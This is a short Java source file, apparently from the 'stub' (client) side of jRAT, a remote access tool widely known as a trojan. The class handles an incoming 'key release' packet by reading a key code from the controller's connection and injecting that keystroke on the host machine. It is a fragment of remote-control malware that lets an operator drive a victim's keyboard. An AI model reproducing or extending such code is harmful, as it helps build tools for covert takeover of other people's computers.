package io.jrat.stub.packets.incoming;

import io.jrat.common.utils.Utils;
import io.jrat.stub.Connection;
import io.jrat.stub.utils.ScreenUtils;

public class Packet95KeyRelease extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int btn = con.readInt();
		
		if (!Utils.isHeadless()) {
			try {
				ScreenUtils.getDefault().keyRelease(btn);
			} catch (IllegalArgumentException e) {

			}
		}
	}

}
